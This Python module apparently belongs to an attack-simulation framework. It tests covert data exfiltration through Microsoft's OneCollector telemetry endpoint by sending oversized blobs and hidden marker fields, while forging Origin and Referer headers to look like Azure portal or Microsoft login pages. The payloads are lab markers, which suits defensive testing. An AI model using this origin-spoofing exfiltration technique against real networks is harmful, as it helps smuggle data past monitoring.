"""OneCollector /OneCollector/1.0/ ingest target (cf. source-files/hyperject-msrc.py)."""
from __future__ import annotations

import time

from ..base import TargetModule
from ..core import (Prepared, variant_count, covert_marker, large_blob,
                    now_iso, sample_hex)


class OneCollectorModule(TargetModule):
    name = "one_collector"
    description = "onecollector ingest"

    def default_config(self, base_url: str) -> dict:
        return {
            "enabled": True,
            "description": self.description,
            "endpoints": [f"{base_url}/OneCollector/1.0/"],
            "keys": [{"key": f"labkey-{sample_hex(12)}",
                      "ikey": f"labikey-{sample_hex(8)}", "origin": "lab"}],
            "accept_status": 204,
        }

    def _build(self, key_data, cfg, variant, index):
        params = {
            "cors": "true", "content-type": "application/x-json-stream",
            "client-id": "NO_AUTH", "client-version": "1DS-Web-JS-4.2.1",
            "apikey": key_data["key"], "upload-time": str(int(time.time() * 1000)),
            "time-delta-to-apply-millis": "0", "w": "2", "NoResponseBody": "true",
        }
        prog = {
            "name": f"BAS_{variant}_{index}", "time": now_iso(), "ver": "4.0",
            "iKey": f"o:{key_data['ikey']}", "ext": {}, "data": {},
        }
        if variant == "large":
            prog["data"]["baseData"] = {"properties": {"blob": large_blob(cfg)}}
        if variant == "covert":
            prog["tags"] = {cfg["techniques"]["covert_field"]["field"]: covert_marker(cfg)}
        headers = {"Content-Type": "text/plain;charset=UTF-8"}
        # spoof the browser Origin/Referer the way the source PoC does (per key)
        origin = self._origin_for(key_data)
        if origin:
            headers["Origin"] = origin
            headers["Referer"] = origin + "/"
        return params, prog, headers

    @staticmethod
    def _origin_for(key_data) -> str:
        explicit = key_data.get("origin_url")
        if explicit:
            return explicit
        origin = (key_data.get("origin") or "").lower()
        if "portal" in origin:
            return "https://portal.azure.com"
        if "login" in origin:
            return "https://login.microsoftonline.com"
        return ""

    def plan(self, mcfg, cfg, variants):
        accept_status = mcfg.get("accept_status", 204)

        def check(r):
            return r.status_code == accept_status

        out = []
        for endpoint in mcfg.get("endpoints", []):
            for key_data in mcfg.get("keys", []):
                label = key_data.get("label") or key_data.get("origin") or ""
                target = f"{endpoint} [{label}]" if label else endpoint
                for v in variants:
                    preps = []
                    for i in range(variant_count(v, cfg)):
                        params, prog, headers = self._build(key_data, cfg, v, i)
                        preps.append(Prepared("POST", endpoint,
                                              {"params": params, "json": prog,
                                               "headers": headers}, check))
                    out.append((v, target, preps))
        return out
